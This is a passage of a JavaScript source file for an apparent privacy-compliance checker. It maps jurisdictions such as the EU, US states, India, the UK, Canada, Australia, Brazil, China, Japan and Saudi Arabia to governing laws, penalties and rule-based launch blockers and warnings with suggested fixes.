  { name: 'Kyrgyzstan', flag: '🇰🇬', region: 'Central Asia', jId: 'global-baseline' },
  { name: 'Tajikistan', flag: '🇹🇯', region: 'Central Asia', jId: 'global-baseline' },
  { name: 'Mongolia', flag: '🇲🇳', region: 'East Asia', jId: 'global-baseline' },
  { name: 'North Korea', flag: '🇰🇵', region: 'East Asia', jId: 'global-baseline' },
  { name: 'Taiwan', flag: '🇹🇼', region: 'East Asia', jId: 'global-baseline' },
  { name: 'Myanmar', flag: '🇲🇲', region: 'Southeast Asia', jId: 'global-baseline' },
  { name: 'Cambodia', flag: '🇰🇭', region: 'Southeast Asia', jId: 'global-baseline' },
  { name: 'Laos', flag: '🇱🇦', region: 'Southeast Asia', jId: 'global-baseline' },
  { name: 'Brunei', flag: '🇧🇳', region: 'Southeast Asia', jId: 'global-baseline' },
  { name: 'Timor-Leste', flag: '🇹🇱', region: 'Southeast Asia', jId: 'global-baseline' },
  { name: 'Azerbaijan', flag: '🇦🇿', region: 'West Asia', jId: 'global-baseline' },
  { name: 'Georgia', flag: '🇬🇪', region: 'West Asia', jId: 'global-baseline' },
  { name: 'Armenia', flag: '🇦🇲', region: 'West Asia', jId: 'global-baseline' },

  // Africa (54)
  { name: 'South Africa', flag: '🇿🇦', region: 'Africa', jId: 'southafrica' },
  { name: 'Nigeria', flag: '🇳🇬', region: 'Africa', jId: 'global-baseline' },
  { name: 'Egypt', flag: '🇪🇬', region: 'Africa', jId: 'global-baseline' },
  { name: 'Kenya', flag: '🇰🇪', region: 'Africa', jId: 'global-baseline' },
  { name: 'Ghana', flag: '🇬🇭', region: 'Africa', jId: 'global-baseline' },
  { name: 'Morocco', flag: '🇲🇦', region: 'Africa', jId: 'global-baseline' },
  { name: 'Algeria', flag: '🇩🇿', region: 'Africa', jId: 'global-baseline' },
  { name: 'Tunisia', flag: '🇹🇳', region: 'Africa', jId: 'global-baseline' },
  { name: 'Ethiopia', flag: '🇪🇹', region: 'Africa', jId: 'global-baseline' },
  { name: 'Tanzania', flag: '🇹🇿', region: 'Africa', jId: 'global-baseline' },
  { name: 'Uganda', flag: '🇺🇬', region: 'Africa', jId: 'global-baseline' },
  { name: 'Angola', flag: '🇦🇴', region: 'Africa', jId: 'global-baseline' },
  { name: 'Mozambique', flag: '🇲🇿', region: 'Africa', jId: 'global-baseline' },
  { name: 'Madagascar', flag: '🇲🇬', region: 'Africa', jId: 'global-baseline' },
  { name: 'Côte d\'Ivoire', flag: '🇨🇮', region: 'Africa', jId: 'global-baseline' },
  { name: 'Cameroon', flag: '🇨🇲', region: 'Africa', jId: 'global-baseline' },
  { name: 'Niger', flag: '🇳🇪', region: 'Africa', jId: 'global-baseline' },
  { name: 'Mali', flag: '🇲🇱', region: 'Africa', jId: 'global-baseline' },
  { name: 'Burkina Faso', flag: '🇧🇫', region: 'Africa', jId: 'global-baseline' },
  { name: 'Malawi', flag: '🇲🇼', region: 'Africa', jId: 'global-baseline' },
  { name: 'Zambia', flag: '🇿🇲', region: 'Africa', jId: 'global-baseline' },
  { name: 'Chad', flag: '🇹🇩', region: 'Africa', jId: 'global-baseline' },
  { name: 'Somalia', flag: '🇸🇴', region: 'Africa', jId: 'global-baseline' },
  { name: 'Senegal', flag: '🇸🇳', region: 'Africa', jId: 'global-baseline' },
  { name: 'Zimbabwe', flag: '🇿🇼', region: 'Africa', jId: 'global-baseline' },
  { name: 'Guinea', flag: '🇬🇳', region: 'Africa', jId: 'global-baseline' },
  { name: 'Rwanda', flag: '🇷🇼', region: 'Africa', jId: 'global-baseline' },
  { name: 'Benin', flag: '🇧🇯', region: 'Africa', jId: 'global-baseline' },
  { name: 'Burundi', flag: '🇧🇮', region: 'Africa', jId: 'global-baseline' },
  { name: 'South Sudan', flag: '🇸🇸', region: 'Africa', jId: 'global-baseline' },
  { name: 'Togo', flag: '🇹🇬', region: 'Africa', jId: 'global-baseline' },
  { name: 'Sierra Leone', flag: '🇸🇱', region: 'Africa', jId: 'global-baseline' },
  { name: 'Libya', flag: '🇱🇾', region: 'Africa', jId: 'global-baseline' },
  { name: 'Congo', flag: '🇨🇬', region: 'Africa', jId: 'global-baseline' },
  { name: 'DR Congo', flag: '🇨🇩', region: 'Africa', jId: 'global-baseline' },
  { name: 'Central African Republic', flag: '🇨🇫', region: 'Africa', jId: 'global-baseline' },
  { name: 'Liberia', flag: '🇱🇷', region: 'Africa', jId: 'global-baseline' },
  { name: 'Mauritania', flag: '🇲🇷', region: 'Africa', jId: 'global-baseline' },
  { name: 'Eritrea', flag: '🇪🇷', region: 'Africa', jId: 'global-baseline' },
  { name: 'Namibia', flag: '🇳🇦', region: 'Africa', jId: 'global-baseline' },
  { name: 'Gambia', flag: '🇬🇲', region: 'Africa', jId: 'global-baseline' },
  { name: 'Botswana', flag: '🇧🇼', region: 'Africa', jId: 'global-baseline' },
  { name: 'Gabon', flag: '🇬🇦', region: 'Africa', jId: 'global-baseline' },
  { name: 'Lesotho', flag: '🇱🇸', region: 'Africa', jId: 'global-baseline' },
  { name: 'Guinea-Bissau', flag: '🇬🇼', region: 'Africa', jId: 'global-baseline' },
  { name: 'Equatorial Guinea', flag: '🇬🇶', region: 'Africa', jId: 'global-baseline' },
  { name: 'Mauritius', flag: '🇲🇺', region: 'Africa', jId: 'global-baseline' },
  { name: 'Eswatini', flag: '🇸🇿', region: 'Africa', jId: 'global-baseline' },
  { name: 'Djibouti', flag: '🇩🇯', region: 'Africa', jId: 'global-baseline' },
  { name: 'Comoros', flag: '🇰🇲', region: 'Africa', jId: 'global-baseline' },
  { name: 'Cape Verde', flag: '🇨🇻', region: 'Africa', jId: 'global-baseline' },
  { name: 'Sao Tome and Principe', flag: '🇸🇹', region: 'Africa', jId: 'global-baseline' },
  { name: 'Seychelles', flag: '🇸🇨', region: 'Africa', jId: 'global-baseline' },
  { name: 'Sudan', flag: '🇸🇩', region: 'Africa', jId: 'global-baseline' },

  // Oceania (14)
  { name: 'Australia', flag: '🇦🇺', region: 'Oceania', jId: 'australia' },
  { name: 'New Zealand', flag: '🇳🇿', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Papua New Guinea', flag: '🇵🇬', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Fiji', flag: '🇫🇯', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Solomon Islands', flag: '🇸🇧', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Vanuatu', flag: '🇻🇺', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Samoa', flag: '🇼🇸', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Kiribati', flag: '🇰🇮', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Micronesia', flag: '🇫🇲', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Tonga', flag: '🇹🇴', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Marshall Islands', flag: '🇲🇭', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Palau', flag: '🇵🇼', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Tuvalu', flag: '🇹🇻', region: 'Oceania', jId: 'global-baseline' },
  { name: 'Nauru', flag: '🇳🇷', region: 'Oceania', jId: 'global-baseline' }
];

// --- 6.1 Global Jurisdictions & Worldwide Launch Readiness Database ---
const JURISDICTIONS = [
  {
    id: 'eu',
    name: 'European Union & EEA',
    flag: '🇪🇺',
    region: 'Europe',
    countries: [
      'Germany', 'France', 'Italy', 'Spain', 'Netherlands', 'Belgium', 'Austria', 
      'Sweden', 'Poland', 'Ireland', 'Denmark', 'Finland', 'Portugal', 'Greece', 
      'Czech Republic', 'Romania', 'Hungary', 'Slovakia', 'Bulgaria', 'Croatia', 
      'Lithuania', 'Slovenia', 'Latvia', 'Estonia', 'Cyprus', 'Luxembourg', 'Malta', 
      'Norway', 'Iceland', 'Liechtenstein'
    ],
    governingLaws: 'GDPR (EU 2016/679) & ePrivacy Directive (2002/58/EC)',
    statutoryPenalties: 'Up to €20,000,000 or 4% of total worldwide annual turnover',
    regulatoryBody: 'European Data Protection Board (EDPB) & National DPAs (BfDI, CNIL, DPC, AEPD)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const fontFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-GOOGLE-FONTS');
      if (fontFlaw || answers['PRIV-07'] === 'gap') {
        blockers.push({
          title: 'Illegal Google Fonts Dynamic IP Transfer (Munich Court 2022 Ruling)',
          law: 'GDPR Article 6(1)(f) & CJEU Schrems II',
          desc: 'Dynamic fetching of Google Fonts transfers EU users\' IP addresses to US servers without prior consent, ruled an illegal GDPR violation by Munich Regional Court / Landgericht München (Case 3 O 17493/20). Statutory damages and fines up to €250,000 per violation.',
          fix: 'In Flutter: Set `GoogleFonts.config.allowRuntimeFetching = false;` in `main()` and bundle TTF files in `assets/`. In Web: Self-host fonts locally with `@font-face`.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        blockers.push({
          title: 'Unconsented Session Replay Surveillance & Profiling',
          law: 'GDPR Articles 6(1)(a), 7 & ePrivacy Directive Art 5(3)',
          desc: 'Session recording scripts (FullStory, LogRocket, Smartlook, Clarity) record user behavior without active, prior opt-in consent.',
          fix: 'Delay session replay initialization until explicit opt-in consent is obtained from the cookie banner (`consentGranted()`). Mask all form fields with `maskAllInputs: true`.'
        });
      }

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Missing Child Age Gate (<16 Years Parental Consent)',
          law: 'GDPR Article 8 (Conditions applicable to child consent)',
          desc: 'Collecting personal information from children under 16 without age verification or verifiable parental consent violates GDPR Article 8.',
          fix: 'Deploy a neutral Date of Birth (DOB) gate on registration. Enforce parental consent verification for users under 16 years old.'
        });
      }

      if (answers['PRIV-01'] === 'gap') {
        warnings.push({
          title: 'Missing Data Subject Right to Erasure / Deletion',
          law: 'GDPR Article 17 (Right to be Forgotten)',
          desc: 'Users must be provided an automated mechanism to delete their accounts and purge personal data.',
          fix: 'Implement `/api/user/delete-account` endpoint that deletes or anonymizes user PII within 30 days.'
        });
      }

      if (answers['PRIV-02'] === 'gap') {
        warnings.push({
          title: 'Missing Prior Cookie Consent Banner',
          law: 'ePrivacy Directive Art 5(3) & GDPR Art 7',
          desc: 'Non-essential analytics and tracking cookies fired prior to user consent.',
          fix: 'Integrate a compliant CMP banner (Cookiebot, Klaro, OneTrust) blocking non-essential tags until explicit consent.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'us-fed',
    name: 'United States (Federal)',
    flag: '🇺🇸',
    region: 'North America',
    countries: ['United States', 'United States (Federal)'],
    governingLaws: 'COPPA (15 U.S.C. §§ 6501–6506), CAN-SPAM Act (15 U.S.C. § 7704), FTC Act Sec 5',
    statutoryPenalties: 'Up to $51,744 per COPPA violation; Up to $50,120 per CAN-SPAM non-compliant email',
    regulatoryBody: 'Federal Trade Commission (FTC)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Missing COPPA Neutral Age Gate in Registration',
          law: 'COPPA 15 U.S.C. § 6502 & FTC Rule 16 C.F.R. Part 312',
          desc: 'Collecting personal information (names, emails, persistent identifiers) from children under 13 without verifiable parental consent creates severe strict liability enforcement from the FTC ($51,744 per violation).',
          fix: 'Add a neutral Date of Birth (DOB) input on signup. Users under 13 must be blocked or directed to FTC-approved Verifiable Parental Consent (VPC).'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw || answers['COMM-01'] === 'gap') {
        blockers.push({
          title: 'CAN-SPAM Non-Compliance: Missing Unsubscribe or Postal Address',
          law: 'CAN-SPAM Act 15 U.S.C. § 7704(a)(5)(A)',
          desc: 'Commercial emails sent without an unsubscribe mechanism or registered physical postal street address incur statutory FTC fines of up to $50,120 per email sent.',
          fix: 'Add `{{unsubscribe_url}}` link, RFC 8058 `List-Unsubscribe` header, and your company\'s physical postal address to all outbound email templates.'
        });
      }

      const secretFlaw = findings.find(f => f.category === 'Secret Leak');
      if (secretFlaw) {
        warnings.push({
          title: 'FTC Act Section 5 Security Failure (Hardcoded Secrets)',
          law: 'FTC Act 15 U.S.C. § 45 (Unfair Security Practices)',
          desc: 'Hardcoded cloud credentials (AWS, OpenAI, DB URIs) violate reasonable security safeguard standards enforced under FTC consent orders.',
          fix: 'Migrate all credentials to environment variables or AWS Secrets Manager.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'us-ca',
    name: 'United States — California',
    flag: '🇺🇸',
    region: 'North America',
    countries: ['California (USA)'],
    governingLaws: 'CCPA / CPRA (Cal. Civ. Code § 1798.100+) & CalOPPA',
    statutoryPenalties: 'Up to $7,500 per intentional violation; $100–$750 statutory damages per consumer per incident under private right of action',
    regulatoryBody: 'California Privacy Protection Agency (CPPA) & CA Attorney General',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        blockers.push({
          title: 'Session Replay Classified as "Sharing" for Behavioral Advertising',
          law: 'Cal. Civ. Code § 1798.140(ad) & § 1798.120',
          desc: 'Transmitting user telemetry and session recordings to third-party SDKs constitutes "sharing" under CPRA, requiring a prominent "Do Not Sell or Share My Personal Information" link and opt-out signal compliance.',
          fix: 'Provide a "Do Not Share My Info" mechanism and enable strict input field masking (`maskAllInputs: true`) in replay SDKs.'
        });
      }

      const dbLeak = findings.find(f => f.ruleId === 'SEC-SECRET-DB');
      if (dbLeak) {
        blockers.push({
          title: 'Private Right of Action Liability for Unencrypted Credentials',
          law: 'Cal. Civ. Code § 1798.150',
          desc: 'Exposed database passwords subject companies to consumer class actions with statutory damages of $100 to $750 per consumer without requiring proof of actual harm.',
          fix: 'Remove database credentials immediately and revoke compromised connection strings.'
        });
      }

      if (answers['PRIV-01'] === 'gap') {
        warnings.push({
          title: 'Missing California Consumer Right to Delete',
          law: 'Cal. Civ. Code § 1798.105',
          desc: 'Consumers possess statutory right to request deletion of personal information.',
          fix: 'Provide consumer deletion request portal with 45-day response window.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'us-wiretap',
    name: 'United States — Pennsylvania & Florida',
    flag: '🇺🇸',
    region: 'North America',
    countries: ['Pennsylvania (USA)', 'Florida (USA)'],
    governingLaws: 'PA Wiretap Act (18 Pa.C.S. § 5701) & FL Security of Communications Act (Fla. Stat. § 934.03)',
    statutoryPenalties: '$1,000 per violation (PA) / $1,000–$5,000 statutory damages per user (FL)',
    regulatoryBody: 'State Courts & Class Action Litigation Doctrine',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        blockers.push({
          title: 'Unconsented Two-Party Wiretap Doctrine Violation',
          law: '18 Pa.C.S. § 5701 & Fla. Stat. § 934.03 (Two-Party Wiretap)',
          desc: 'Pennsylvania and Florida require ALL parties to consent before recording electronic communications. Courts have held unconsented session replay scripts (FullStory, LogRocket, Hotjar) constitute unlawful wiretapping of keystrokes.',
          fix: 'Require explicit affirmative consent modal before recording sessions. Enable total DOM masking for all input elements.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : 'ready';
      return { status, blockers, warnings };
    }
  },
  {
    id: 'india',
    name: 'India',
    flag: '🇮🇳',
    region: 'Asia-Pacific',
    countries: ['India'],
    governingLaws: 'Digital Personal Data Protection Act 2023 (DPDP Act 2023) & RBI Localization Directives',
    statutoryPenalties: 'Up to ₹250 Crore (~$30,000,000 USD) for breach of obligations relating to children; Up to ₹200 Crore for security lapses',
    regulatoryBody: 'Data Protection Board of India (DPBI) & Reserve Bank of India (RBI)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Processing Children\'s Data Without Verifiable Parental Consent',
          law: 'DPDP Act 2023 Section 9(1) & 9(3)',
          desc: 'In India, a "child" is defined as any individual under 18 years old. Section 9 strictly prohibits tracking, behavioral monitoring, or targeted advertising directed at children, and requires verifiable parental consent. Penalties reach up to ₹250 Crore (~$30M USD).',
          fix: 'Deploy an age verification gate. For users under 18 in India, obtain verifiable parental consent and completely disable analytics/replay tracking.'
        });
      }

      const sqliFlaw = findings.find(f => f.category === 'Database Attacks');
      const secretFlaw = findings.find(f => f.category === 'Secret Leak');
      if (sqliFlaw || secretFlaw) {
        blockers.push({
          title: 'Failure to Maintain Reasonable Security Safeguards',
          law: 'DPDP Act 2023 Section 8(5)',
          desc: 'Data Fiduciaries must implement reasonable security safeguards to prevent personal data breaches. SQL injection vulnerabilities and leaked database keys trigger penalties up to ₹200 Crore.',
          fix: 'Enforce parameterized queries and eliminate raw credentials from source code.'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw) {
        warnings.push({
          title: 'Unsolicited Commercial Electronic Communications',
          law: 'DPDP Act 2023 Consent Provisions & TRAI Telecom Commercial Communications',
          desc: 'Sending marketing communications without transparent consent and instant opt-out violates Indian consumer privacy norms.',
          fix: 'Add clear unsubscribe mechanism and business identity to all emails.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'uk',
    name: 'United Kingdom',
    flag: '🇬🇧',
    region: 'Europe',
    countries: ['United Kingdom', 'England', 'Scotland', 'Wales', 'Northern Ireland'],
    governingLaws: 'UK GDPR, Data Protection Act 2018, ICO Age Appropriate Design Code & PECR',
    statutoryPenalties: 'Up to £17,500,000 or 4% of annual worldwide turnover; PECR fines up to £500,000',
    regulatoryBody: 'Information Commissioner\'s Office (ICO)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Breach of ICO Age Appropriate Design Code (Children\'s Code)',
          law: 'UK DPA 2018 Section 123 & ICO Children\'s Code Standards',
          desc: 'The UK Children\'s Code applies to all services likely to be accessed by under-18s. It mandates high-privacy settings by default and forbids nudge techniques or tracking without explicit parental safeguards.',
          fix: 'Incorporate age-assurance mechanism; set privacy settings to maximum by default for minor UK users.'
        });
      }

      const fontFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-GOOGLE-FONTS');
      if (fontFlaw || answers['PRIV-07'] === 'gap') {
        warnings.push({
          title: 'Dynamic Google Fonts IP Transmission to Third Parties',
          law: 'UK GDPR Article 6 & PECR Reg 6',
          desc: 'Transmitting user IP addresses without transparency or consent runs afoul of UK GDPR data minimisation.',
          fix: 'Self-host fonts locally or set `allowRuntimeFetching = false;` in Flutter.'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw || answers['COMM-01'] === 'gap') {
        blockers.push({
          title: 'PECR Electronic Mail Marketing Violation (Missing Unsubscribe)',
          law: 'PECR Regulation 22 (Direct Marketing by Electronic Mail)',
          desc: 'Sending marketing emails without a valid opt-out address or unsubscribe facility is prohibited under Regulation 22.',
          fix: 'Add clear unsubscribe link and valid postal/registered address to all emails.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'canada',
    name: 'Canada',
    flag: '🇨🇦',
    region: 'North America',
    countries: ['Canada'],
    governingLaws: 'PIPEDA & Canada\'s Anti-Spam Legislation (CASL)',
    statutoryPenalties: 'CASL fines up to $10,000,000 CAD per violation (corporations); PIPEDA damages up to $100,000 CAD',
    regulatoryBody: 'Office of the Privacy Commissioner of Canada (OPC) & CRTC',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Missing Child Online Consent / Age Assurance (<13 Years)',
          law: 'PIPEDA Principle 4.3 & OPC Guidance on Online Child Consent',
          desc: 'Under OPC guidelines, consent for the collection of personal data from children under 13 must be obtained from a parent or legal guardian.',
          fix: 'Deploy neutral Date of Birth (DOB) gate on signup and require parental consent for users under 13.'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw || answers['COMM-01'] === 'gap') {
        blockers.push({
          title: 'CASL Commercial Electronic Message (CEM) Violation',
          law: 'Canada\'s Anti-Spam Legislation (CASL) Section 6 & CRTC Regulations',
          desc: 'CASL strictly prohibits sending commercial electronic messages without an unsubscribe mechanism that is functional for at least 60 days, and the physical mailing address of the sender. Penalties reach up to $10M CAD.',
          fix: 'Ensure all emails contain a one-click unsubscribe mechanism active for 60 days, sender name, and postal mailing address.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        warnings.push({
          title: 'PIPEDA Meaningful Consent for Telemetry Interception',
          law: 'PIPEDA Principle 4.3 (Consent)',
          desc: 'Canadian privacy commissioners require clear, explicit consent before recording website sessions.',
          fix: 'Present opt-in banner prior to firing session replay tools.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'australia',
    name: 'Australia',
    flag: '🇦🇺',
    region: 'Asia-Pacific',
    countries: ['Australia'],
    governingLaws: 'Privacy Act 1988 (Australian Privacy Principles - APPs) & Spam Act 2003',
    statutoryPenalties: 'Up to $50,000,000 AUD or 30% of adjusted turnover for serious privacy breaches; Spam Act fines up to $2,220,000 AUD',
    regulatoryBody: 'Office of the Australian Information Commissioner (OAIC) & ACMA',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Processing Minor Personal Information Without Capacity or Guardian Consent',
          law: 'Privacy Act 1988 (APPs) & OAIC Children\'s Privacy Guidance',
          desc: 'Entities collecting personal information from minors who lack capacity to consent (under 15/18) must obtain parental/guardian consent.',
          fix: 'Implement neutral age verification gate and obtain verifiable parental consent.'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw || answers['COMM-01'] === 'gap') {
        blockers.push({
          title: 'Spam Act 2003 Functional Unsubscribe Facility Violation',
          law: 'Spam Act 2003 Schedule 2 (Unsubscribe Facility)',
          desc: 'Commercial electronic messages must include a functional unsubscribe facility that remains operational for at least 30 days and accurately identify the sender.',
          fix: 'Add unsubscribe link and physical business details in email footer.'
        });
      }

      const fontFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-GOOGLE-FONTS');
      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (fontFlaw || replayFlaw) {
        warnings.push({
          title: 'Cross-Border Personal Data Disclosure (APP 8)',
          law: 'Australian Privacy Principle 8 (Cross-border disclosure)',
          desc: 'Transmitting user identifiers to overseas third-party recipients requires transparency and contractual safeguards.',
          fix: 'Disclose international data transfers and self-host fonts locally.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'brazil',
    name: 'Brazil',
    flag: '🇧🇷',
    region: 'Latin America',
    countries: ['Brazil'],
    governingLaws: 'Lei Geral de Proteção de Dados (LGPD - Law No. 13.709/2018)',
    statutoryPenalties: 'Up to 2% of company revenue in Brazil, capped at R$ 50,000,000 per infraction',
    regulatoryBody: 'Autoridade Nacional de Proteção de Dados (ANPD)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Processing Children\'s Data Without Specific Parental Consent',
          law: 'LGPD Article 14 (§1)',
          desc: 'Processing of personal data of children (under 12) must be carried out with specific and prominent consent given by at least one parent or legal representative.',
          fix: 'Enforce age gate at signup and collect verified parental consent for children.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        warnings.push({
          title: 'Session Tracking Without Recognized LGPD Legal Basis',
          law: 'LGPD Article 7 (Legal Bases for Processing)',
          desc: 'Recording user sessions requires valid legal basis, typically affirmative consent for behavioral analytics.',
          fix: 'Obtain user consent before loading session replay SDKs.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'china',
    name: 'China',
    flag: '🇨🇳',
    region: 'Asia-Pacific',
    countries: ['China'],
    governingLaws: 'Personal Information Protection Law (PIPL) & Minor Protection Regulations',
    statutoryPenalties: 'Up to 50,000,000 RMB or 5% of annual turnover; suspension of app store distribution',
    regulatoryBody: 'Cyberspace Administration of China (CAC)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Special Rules for Processing Minors Under 14 Personal Information',
          law: 'PIPL Article 31',
          desc: 'Personal information of minors under 14 is classified as sensitive personal information, requiring dedicated parental consent and special processing rules.',
          fix: 'Implement age gate for minors under 14 with dedicated parental consent verification.'
        });
      }

      const fontFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-GOOGLE-FONTS');
      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (fontFlaw || replayFlaw) {
        blockers.push({
          title: 'Unassessed Cross-Border Data Transfer to Foreign Entities',
          law: 'PIPL Article 38 (Cross-Border Data Transfer Security Assessment)',
          desc: 'Exfiltrating telemetry to US-based SDKs (Google, FullStory, LogRocket) without CAC standard contracts or security assessment violates PIPL.',
          fix: 'Host all fonts and telemetry inside domestic Chinese infrastructure; remove foreign replay SDKs.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'japan',
    name: 'Japan',
    flag: '🇯🇵',
    region: 'Asia-Pacific',
    countries: ['Japan'],
    governingLaws: 'Act on the Protection of Personal Information (APPI)',
    statutoryPenalties: 'Up to ¥100,000,000 for corporations; public enforcement orders',
    regulatoryBody: 'Personal Information Protection Commission (PPC)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Processing Children\'s Data (<15 Years) Without Statutory Agent Consent',
          law: 'APPI Article 16/20 & PPC Guidelines on Minors',
          desc: 'Under APPI guidelines, collecting personal data from children under 15 requires consent from a statutory agent (parent or guardian).',
          fix: 'Implement age gate at registration and secure parent/guardian consent for minors under 15.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        warnings.push({
          title: 'Provision of Personal Data to Third Parties / Foreign Servers',
          law: 'APPI Article 27 & 28',
          desc: 'Transferring user identifiers to foreign analytics services requires notifying users or obtaining consent.',
          fix: 'Disclose third-party analytics in privacy notice and provide opt-out.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'saudi',
    name: 'Saudi Arabia',
    flag: '🇸🇦',
    region: 'Middle East',
    countries: ['Saudi Arabia'],
    governingLaws: 'Personal Data Protection Law (PDPL - Royal Decree M/19)',
    statutoryPenalties: 'Up to SAR 5,000,000; criminal imprisonment for sensitive data leaks',
    regulatoryBody: 'Saudi Data and Artificial Intelligence Authority (SDAIA)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw) {
        warnings.push({
          title: 'Cross-Border Personal Data Transfer Restrictions',
          law: 'PDPL Article 29 & Transfer Regulations',
          desc: 'Cross-border transfer of Saudi residents\' telemetry requires compliance with SDAIA adequacy controls.',
          fix: 'Ensure session replay tools obtain consent and utilize regional data residency.'
        });
      }

